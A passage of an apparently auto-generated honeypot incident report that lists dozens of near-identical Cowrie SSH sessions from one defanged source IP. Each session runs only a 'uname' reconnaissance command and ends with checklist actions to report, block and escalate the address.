| `2026-08-15 20:21:10` | `cowrie.client.version` |
| `2026-08-15 20:21:11` | `cowrie.client.kex` |
| `2026-08-15 20:21:11` | `cowrie.login.success` |
| `2026-08-15 20:21:12` | `cowrie.session.params` |
| `2026-08-15 20:21:12` | `cowrie.command.input` |
| `2026-08-15 20:21:12` | `cowrie.log.closed` |
| `2026-08-15 20:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07bd3184d14f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:16` | `cowrie.session.connect` |
| `2026-08-15 20:21:16` | `cowrie.client.version` |
| `2026-08-15 20:21:16` | `cowrie.client.kex` |
| `2026-08-15 20:21:16` | `cowrie.login.success` |
| `2026-08-15 20:21:17` | `cowrie.session.params` |
| `2026-08-15 20:21:17` | `cowrie.command.input` |
| `2026-08-15 20:21:18` | `cowrie.log.closed` |
| `2026-08-15 20:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd5dd4a0dbc9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:21` | `cowrie.session.connect` |
| `2026-08-15 20:21:21` | `cowrie.client.version` |
| `2026-08-15 20:21:21` | `cowrie.client.kex` |
| `2026-08-15 20:21:21` | `cowrie.login.success` |
| `2026-08-15 20:21:22` | `cowrie.session.params` |
| `2026-08-15 20:21:22` | `cowrie.command.input` |
| `2026-08-15 20:21:22` | `cowrie.log.closed` |
| `2026-08-15 20:21:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc5389147fc1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:26` | `cowrie.session.connect` |
| `2026-08-15 20:21:26` | `cowrie.client.version` |
| `2026-08-15 20:21:26` | `cowrie.client.kex` |
| `2026-08-15 20:21:26` | `cowrie.login.success` |
| `2026-08-15 20:21:27` | `cowrie.session.params` |
| `2026-08-15 20:21:27` | `cowrie.command.input` |
| `2026-08-15 20:21:27` | `cowrie.log.closed` |
| `2026-08-15 20:21:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53b27a58a490

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:31` | `cowrie.session.connect` |
| `2026-08-15 20:21:31` | `cowrie.client.version` |
| `2026-08-15 20:21:31` | `cowrie.client.kex` |
| `2026-08-15 20:21:31` | `cowrie.login.success` |
| `2026-08-15 20:21:32` | `cowrie.session.params` |
| `2026-08-15 20:21:32` | `cowrie.command.input` |
| `2026-08-15 20:21:33` | `cowrie.log.closed` |
| `2026-08-15 20:21:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9795494af968

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:36` | `cowrie.session.connect` |
| `2026-08-15 20:21:36` | `cowrie.client.version` |
| `2026-08-15 20:21:36` | `cowrie.client.kex` |
| `2026-08-15 20:21:37` | `cowrie.login.success` |
| `2026-08-15 20:21:37` | `cowrie.session.params` |
| `2026-08-15 20:21:37` | `cowrie.command.input` |
| `2026-08-15 20:21:37` | `cowrie.log.closed` |
| `2026-08-15 20:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d26b79d6cb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:41` | `cowrie.session.connect` |
| `2026-08-15 20:21:41` | `cowrie.client.version` |
| `2026-08-15 20:21:41` | `cowrie.client.kex` |
| `2026-08-15 20:21:42` | `cowrie.login.success` |
| `2026-08-15 20:21:43` | `cowrie.session.params` |
| `2026-08-15 20:21:43` | `cowrie.command.input` |
| `2026-08-15 20:21:43` | `cowrie.log.closed` |
| `2026-08-15 20:21:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3279784078f3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:46` | `cowrie.session.connect` |
| `2026-08-15 20:21:46` | `cowrie.client.version` |
| `2026-08-15 20:21:46` | `cowrie.client.kex` |
| `2026-08-15 20:21:47` | `cowrie.login.success` |
| `2026-08-15 20:21:48` | `cowrie.session.params` |
| `2026-08-15 20:21:48` | `cowrie.command.input` |
| `2026-08-15 20:21:48` | `cowrie.log.closed` |
| `2026-08-15 20:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfe9b564fe9a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:51` | `cowrie.session.connect` |
| `2026-08-15 20:21:51` | `cowrie.client.version` |
| `2026-08-15 20:21:51` | `cowrie.client.kex` |
| `2026-08-15 20:21:52` | `cowrie.login.success` |
| `2026-08-15 20:21:53` | `cowrie.session.params` |
| `2026-08-15 20:21:53` | `cowrie.command.input` |
| `2026-08-15 20:21:53` | `cowrie.log.closed` |
| `2026-08-15 20:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ace2867207

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:21 |
| **Last Seen** | 2026-08-15 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:21:56` | `cowrie.session.connect` |
| `2026-08-15 20:21:56` | `cowrie.client.version` |
| `2026-08-15 20:21:56` | `cowrie.client.kex` |
| `2026-08-15 20:21:57` | `cowrie.login.success` |
| `2026-08-15 20:21:58` | `cowrie.session.params` |
| `2026-08-15 20:21:58` | `cowrie.command.input` |
| `2026-08-15 20:21:58` | `cowrie.log.closed` |
| `2026-08-15 20:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-566839d1ab69

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:02` | `cowrie.session.connect` |
| `2026-08-15 20:22:02` | `cowrie.client.version` |
| `2026-08-15 20:22:02` | `cowrie.client.kex` |
| `2026-08-15 20:22:02` | `cowrie.login.success` |
| `2026-08-15 20:22:03` | `cowrie.session.params` |
| `2026-08-15 20:22:03` | `cowrie.command.input` |
| `2026-08-15 20:22:03` | `cowrie.log.closed` |
| `2026-08-15 20:22:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e92646f72d9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:07` | `cowrie.session.connect` |
| `2026-08-15 20:22:07` | `cowrie.client.version` |
| `2026-08-15 20:22:07` | `cowrie.client.kex` |
| `2026-08-15 20:22:07` | `cowrie.login.success` |
| `2026-08-15 20:22:08` | `cowrie.session.params` |
| `2026-08-15 20:22:08` | `cowrie.command.input` |
| `2026-08-15 20:22:08` | `cowrie.log.closed` |
| `2026-08-15 20:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc735c0fafa5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:12` | `cowrie.session.connect` |
| `2026-08-15 20:22:12` | `cowrie.client.version` |
| `2026-08-15 20:22:12` | `cowrie.client.kex` |
| `2026-08-15 20:22:13` | `cowrie.login.success` |
| `2026-08-15 20:22:13` | `cowrie.session.params` |
| `2026-08-15 20:22:13` | `cowrie.command.input` |
| `2026-08-15 20:22:14` | `cowrie.log.closed` |
| `2026-08-15 20:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8ed35f1958

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:17` | `cowrie.session.connect` |
| `2026-08-15 20:22:17` | `cowrie.client.version` |
| `2026-08-15 20:22:17` | `cowrie.client.kex` |
| `2026-08-15 20:22:18` | `cowrie.login.success` |
| `2026-08-15 20:22:19` | `cowrie.session.params` |
| `2026-08-15 20:22:19` | `cowrie.command.input` |
| `2026-08-15 20:22:19` | `cowrie.log.closed` |
| `2026-08-15 20:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2feea5d0ffaf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:22` | `cowrie.session.connect` |
| `2026-08-15 20:22:22` | `cowrie.client.version` |
| `2026-08-15 20:22:22` | `cowrie.client.kex` |
| `2026-08-15 20:22:23` | `cowrie.login.success` |
| `2026-08-15 20:22:24` | `cowrie.session.params` |
| `2026-08-15 20:22:24` | `cowrie.command.input` |
| `2026-08-15 20:22:24` | `cowrie.log.closed` |
| `2026-08-15 20:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16f498d62a99

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:27` | `cowrie.session.connect` |
| `2026-08-15 20:22:27` | `cowrie.client.version` |
| `2026-08-15 20:22:27` | `cowrie.client.kex` |
| `2026-08-15 20:22:28` | `cowrie.login.success` |
| `2026-08-15 20:22:29` | `cowrie.session.params` |
| `2026-08-15 20:22:29` | `cowrie.command.input` |
| `2026-08-15 20:22:29` | `cowrie.log.closed` |
| `2026-08-15 20:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73c8e2f1e9e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:33` | `cowrie.session.connect` |
| `2026-08-15 20:22:33` | `cowrie.client.version` |
| `2026-08-15 20:22:33` | `cowrie.client.kex` |
| `2026-08-15 20:22:33` | `cowrie.login.success` |
| `2026-08-15 20:22:34` | `cowrie.session.params` |
| `2026-08-15 20:22:34` | `cowrie.command.input` |
| `2026-08-15 20:22:34` | `cowrie.log.closed` |
| `2026-08-15 20:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d25351b0b28

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:38` | `cowrie.session.connect` |
| `2026-08-15 20:22:38` | `cowrie.client.version` |
| `2026-08-15 20:22:39` | `cowrie.client.kex` |
| `2026-08-15 20:22:39` | `cowrie.login.success` |
| `2026-08-15 20:22:40` | `cowrie.session.params` |
| `2026-08-15 20:22:40` | `cowrie.command.input` |
| `2026-08-15 20:22:40` | `cowrie.log.closed` |
| `2026-08-15 20:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-348e539e869d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:44` | `cowrie.session.connect` |
| `2026-08-15 20:22:44` | `cowrie.client.version` |
| `2026-08-15 20:22:44` | `cowrie.client.kex` |
| `2026-08-15 20:22:45` | `cowrie.login.success` |
| `2026-08-15 20:22:46` | `cowrie.session.params` |
| `2026-08-15 20:22:46` | `cowrie.command.input` |
| `2026-08-15 20:22:46` | `cowrie.log.closed` |
| `2026-08-15 20:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fb33e70dd5a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:49` | `cowrie.session.connect` |
| `2026-08-15 20:22:50` | `cowrie.client.version` |
| `2026-08-15 20:22:50` | `cowrie.client.kex` |
| `2026-08-15 20:22:51` | `cowrie.login.success` |
| `2026-08-15 20:22:52` | `cowrie.session.params` |
| `2026-08-15 20:22:52` | `cowrie.command.input` |
| `2026-08-15 20:22:52` | `cowrie.log.closed` |
| `2026-08-15 20:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be8092bb59d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:22 |
| **Last Seen** | 2026-08-15 20:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:22:55` | `cowrie.session.connect` |
| `2026-08-15 20:22:55` | `cowrie.client.version` |
| `2026-08-15 20:22:55` | `cowrie.client.kex` |
| `2026-08-15 20:22:56` | `cowrie.login.success` |
| `2026-08-15 20:22:57` | `cowrie.session.params` |
| `2026-08-15 20:22:57` | `cowrie.command.input` |
| `2026-08-15 20:22:57` | `cowrie.log.closed` |
| `2026-08-15 20:22:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51766f815aa9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:00` | `cowrie.session.connect` |
| `2026-08-15 20:23:01` | `cowrie.client.version` |
| `2026-08-15 20:23:01` | `cowrie.client.kex` |
| `2026-08-15 20:23:01` | `cowrie.login.success` |
| `2026-08-15 20:23:03` | `cowrie.session.params` |
| `2026-08-15 20:23:03` | `cowrie.command.input` |
| `2026-08-15 20:23:03` | `cowrie.log.closed` |
| `2026-08-15 20:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba7816e5c379

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:06` | `cowrie.session.connect` |
| `2026-08-15 20:23:06` | `cowrie.client.version` |
| `2026-08-15 20:23:06` | `cowrie.client.kex` |
| `2026-08-15 20:23:06` | `cowrie.login.success` |
| `2026-08-15 20:23:07` | `cowrie.session.params` |
| `2026-08-15 20:23:07` | `cowrie.command.input` |
| `2026-08-15 20:23:07` | `cowrie.log.closed` |
| `2026-08-15 20:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9304c427c86d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:11` | `cowrie.session.connect` |
| `2026-08-15 20:23:11` | `cowrie.client.version` |
| `2026-08-15 20:23:11` | `cowrie.client.kex` |
| `2026-08-15 20:23:12` | `cowrie.login.success` |
| `2026-08-15 20:23:13` | `cowrie.session.params` |
| `2026-08-15 20:23:13` | `cowrie.command.input` |
| `2026-08-15 20:23:13` | `cowrie.log.closed` |
| `2026-08-15 20:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da5b65f4c3c4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:17` | `cowrie.session.connect` |
| `2026-08-15 20:23:17` | `cowrie.client.version` |
| `2026-08-15 20:23:17` | `cowrie.client.kex` |
| `2026-08-15 20:23:17` | `cowrie.login.success` |
| `2026-08-15 20:23:18` | `cowrie.session.params` |
| `2026-08-15 20:23:18` | `cowrie.command.input` |
| `2026-08-15 20:23:18` | `cowrie.log.closed` |
| `2026-08-15 20:23:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aba2708ffa73

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:23 |
| **Last Seen** | 2026-08-15 20:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:23:22` | `cowrie.session.connect` |
| `2026-08-15 20:23:22` | `cowrie.client.version` |
| `2026-08-15 20:23:22` | `cowrie.client.kex` |
| `2026-08-15 20:23:23` | `cowrie.login.success` |
| `2026-08-15 20:23:24` | `cowrie.session.params` |
| `2026-08-15 20:23:24` | `cowrie.command.input` |
| `2026-08-15 20:23:24` | `cowrie.log.closed` |
| `2026-08-15 20:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ebe7c82ba4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
